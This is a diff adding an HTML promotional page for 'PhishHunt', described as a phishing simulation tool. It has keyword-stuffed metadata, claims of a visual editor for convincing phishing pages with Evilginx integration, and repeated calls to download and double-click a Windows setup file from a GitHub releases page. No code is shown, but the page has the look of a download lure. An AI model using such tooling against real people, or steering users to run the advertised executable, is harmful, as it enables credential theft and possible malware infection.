@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="PhishHunt - The most advanced phishing simulation and security awareness tool. Download and run the ultimate phishing simulation software to protect your organization from cyber threats.">
+    <meta name="keywords" content="awareness,dynamic-fetching,evilginx,evilginx2,evilginx3,gophish,modern-ui,phishing,phishing-attacks,phishing-kit,phishing-page,phishing-script,phishing-simulation,phishing-sites,visual-editor">
+    <meta name="author" content="IbrahimQaiser">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="PhishHunt - The Most Advanced Phishing Simulation & Security Awareness Tool">
+    <meta property="og:description" content="Empower your organization with PhishHunt - the ultimate phishing simulation platform that trains your team to spot and stop cyber threats.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/IbrahimQaiser/PhishHunt">
+    <meta property="og:image" content="https://github.com/IbrahimQaiser/PhishHunt/releases">
+    <title>PhishHunt - Advanced Phishing Simulation & Security Awareness Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #ffffff;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .hero {
+            text-align: center;
+            padding: 80px 20px 40px;
+        }
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #f093fb, #f5576c, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .tagline {
+            font-size: 1.4rem;
+            color: #e0e0e0;
+            margin-bottom: 30px;
+            font-weight: 300;
+        }
+        .btn-primary {
+            display: inline-block;
+            padding: 16px 45px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #ffffff;
+            background: linear-gradient(90deg, #00b09b, #96c93d);
+            border: none;
+            border-radius: 50px;
+            text-decoration: none;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 176, 155, 0.4);
+            margin: 15px 0;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0, 176, 155, 0.6);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin: 60px 0;
+        }
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .feature-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #f093fb;
+        }
+        .feature-card p {
+            color: #cccccc;
+        }
+        .section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 30px 0;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .section h2 {
+            font-size: 2.2rem;
+            margin-bottom: 25px;
+            color: #4facfe;
+            border-bottom: 2px solid rgba(79, 172, 254, 0.5);
+            padding-bottom: 15px;
+        }
+        .section p, .section li {
+            color: #dddddd;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 12px;
+        }
+        .steps {
+            counter-reset: step-counter;
+        }
+        .steps li {
+            list-style: none;
+            counter-increment: step-counter;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            margin-bottom: 15px;
+            position: relative;
+            padding-left: 60px;
+        }
+        .steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 15px;
+            top: 20px;
+            width: 30px;
+            height: 30px;
+            background: #00b09b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: white;
+        }
+        .highlight-box {
+            background: linear-gradient(135deg, rgba(240, 147, 251, 0.2), rgba(245, 87, 108, 0.2));
+            border-left: 5px solid #f093fb;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .faq-item {
+            margin-bottom: 25px;
+        }
+        .faq-item h4 {
+            color: #96c93d;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        a {
+            color: #4facfe;
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            padding: 50px 20px 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 50px;
+            color: #999999;
+        }
+        .btn-secondary {
+            display: inline-block;
+            padding: 12px 35px;
+            font-size: 1.1rem;
+            color: #ffffff;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 50px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+            margin: 15px 5px;
+        }
+        .btn-secondary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(102, 126, 234, 0.6);
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            .container {
+                padding: 10px;
+            }
+            .section {
+                padding: 25px;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hero">
+            <h1>🛡️ PhishHunt - Master Phishing Defense Today</h1>
+            <p class="tagline">The most advanced phishing simulation & security awareness tool</p>
+            <a href="https://github.com/IbrahimQaiser/PhishHunt/releases" class="btn-primary">⬇️ Download PhishHunt Now</a>
+        </div>
+
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🎯 Real-World Simulations</h3>
+                <p>Test your team with phishing simulations that mirror real attack patterns. PhishHunt uses dynamic fetching to create realistic scenarios your employees need to recognize.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎨 Visual Editor</h3>
+                <p>Create convincing phishing pages with our drag-and-drop visual editor. No coding knowledge required - just point, click, and design professional-looking templates.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Advanced Analytics</h3>
+                <p>Track user performance, identify weak spots, and measure improvement over time. PhishHunt provides comprehensive reports to help you strengthen your security posture.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔧 Modern Integration</h3>
+                <p>Built on the latest technology stack including Evilginx integration, Gophish compatibility, and modern UI frameworks. Seamlessly fits into your existing security infrastructure.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Instant Setup</h3>
+                <p>Get up and running in minutes. PhishHunt is designed with simplicity in mind - perfect for organizations of all sizes, from small businesses to large enterprises.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔒 Enhanced Security</h3>
+                <p>Protect your organization from phishing attacks before they happen. Our tool helps you build a human firewall that can identify and report suspicious emails.</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🚀 Getting Started</h2>
+            <p>PhishHunt is designed to be simple and intuitive. Follow these three easy steps to start protecting your organization today:</p>
+            <ol class="steps">
+                <li><strong>Visit the download page:</strong> Go to the official PhishHunt releases page by clicking the download button below or at the top of this page.</li>
+                <li><strong>Download the application:</strong> Once on the releases page, you'll see the latest version of PhishHunt available for download. Visit this link to download the application. Make sure you have a stable internet connection for a smooth download.</li>
+                <li><strong>Run PhishHunt:</strong> After the download completes, double-click the file to launch PhishHunt. Follow the on-screen prompts to configure your first phishing simulation campaign.</li>
+            </ol>
+            <div class="highlight-box">
+                <p style="margin: 0;"><strong>💡 Pro Tip:</strong> Start with a small test group before rolling out organization-wide to ensure your team becomes comfortable with the training process.</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📥 Download & Installation</h2>
+            <p>Getting PhishHunt on your Windows machine is quick and straightforward. Here's everything you need to know:</p>
+            
+            <h3 style="color: #f093fb; margin: 25px 0 15px;">System Requirements</h3>
+            <ul>
+                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+                <li><strong>Processor:</strong> 1 GHz or faster processor</li>
+                <li><strong>RAM:</strong> 4 GB minimum (8 GB recommended)</li>
+                <li><strong>Storage:</strong> 500 MB available disk space</li>
+                <li><strong>Internet Connection:</strong> Required for updates and cloud features</li>
+            </ul>
+            
+            <h3 style="color: #f093fb; margin: 25px 0 15px;">Installation Steps</h3>
+            <ol>
+                <li>Click the <strong>Download PhishHunt</strong> button on this page.</li>
+                <li>You'll be redirected to the official releases page on GitHub.</li>
+                <li>Download the latest version of PhishHunt from the releases page.</li>
+                <li>Once downloaded, navigate to your Downloads folder and double-click the PhishHunt setup file.</li>
+                <li>Follow the simple installation wizard that appears.</li>
+                <li>When installation is complete, launch PhishHunt from your desktop or Start menu.</li>
+            </ol>
+            
+            <div style="text-align: center; margin-top: 30px;">
+                <a href="https://github.com/IbrahimQaiser/PhishHunt/releases" class="btn-primary">⬇️ Get PhishHunt Now</a>
+                <a href="https://github.com/IbrahimQaiser/PhishHunt/releases" class="btn-secondary">📦 View All Versions</a>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>💡 Why Choose PhishHunt?</h2>
+            <p>In today's digital world, phishing attacks are the #1 cybersecurity threat to organizations. Human error accounts for over 90% of successful data breaches. PhishHunt empowers you to transform your employees from being your weakest security link into your strongest defense.</p>
+            <p>Our tool combines cutting-edge technology with user-friendly design, making enterprise-grade security awareness accessible to every organization. With features like:</p>
+            <ul>
+                <li><strong>🎭 Realistic Phishing Templates</strong> - Designed by security experts</li>
+                <li><strong>🔄 Continuous Updates</strong> - Stay ahead of emerging threats</li>
+                <li><strong>📈 Measurable Results</strong> - Track improvement with detailed metrics</li>
+                <li><strong>🏢 Enterprise-Ready</strong> - Suitable for organizations of any size</li>
+                <li><strong>🤝 Community Support</strong> - Join thousands of security professionals</li>
+            </ul>
+            <p>Don't wait until it's too late. Start building your human firewall today with PhishHunt.</p>
+        </div>
+
+        <div class="section">
+            <h2>❓ Frequently Asked Questions</h2>
+            <div class="faq-item">
+                <h4>Is PhishHunt difficult to set up?</h4>
+                <p>Absolutely not! PhishHunt was designed with simplicity in mind. Most users can complete the installation in under 5 minutes and launch their first phishing simulation within the first hour.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Do I need technical knowledge to use it?</h4>
+                <p>No programming or technical background is required. The visual editor and guided workflows make it easy for anyone to create effective phishing simulations.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Can PhishHunt integrate with my existing security tools?</h4>
+                <p>Yes! PhishHunt is compatible with industry-standard tools like Gophish and supports advanced features through Evilginx integration, making it versatile for any security stack.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Is there support available if I need help?</h4>
+                <p>Absolutely! We have comprehensive documentation, video tutorials, and an active community forum. Plus, our support team is always ready to assist you.</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📚 Additional Resources</h2>
+            <p>To help you get the most out of PhishHunt, here are some valuable resources:</p>
+            <ul>
+                <li><strong>📖 User Manual:</strong> In-depth guide covering all features</li>
+                <li><strong>🎥 Video Tutorials:</strong> Step-by-step visual instructions</li>
+                <li><strong>💬 Community Forum:</strong> Connect with other users</li>
+                <li><strong>🔧 Technical Documentation:</strong> For advanced configurations</li>
+                <li><strong>📋 Best Practices:</strong> Tips from security experts</li>
+            </ul>
+            <p>Visit our GitHub repository for access to these resources and more.</p>
+        </div>
+
+        <div class="section" style="text-align: center;">
+            <h2>🚀 Ready to Secure Your Organization?</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 25px;">Join thousands of security professionals who trust PhishHunt to protect their teams from phishing threats.</p>
+            <a href="https://github.com/IbrahimQaiser/PhishHunt/releases" class="btn-primary" style="font-size: 1.4rem; padding: 20px 60px;">🛡️ Download PhishHunt Free</a>
+        </div>
+
+        <div class="footer">
+            <p style="margin-bottom: 10px;">PhishHunt - The Most Advanced Phishing Simulation & Security Awareness Tool</p>
+            <p style="font-size: 0.9rem;">© 2025 PhishHunt. All rights reserved.</p>
+            <p style="font-size: 0.8rem; margin-top: 15px; color: #777;">Security through awareness. Protecting organizations one employee at a time.</p>
+        </div>
+    </div>
+</body>
+</html>
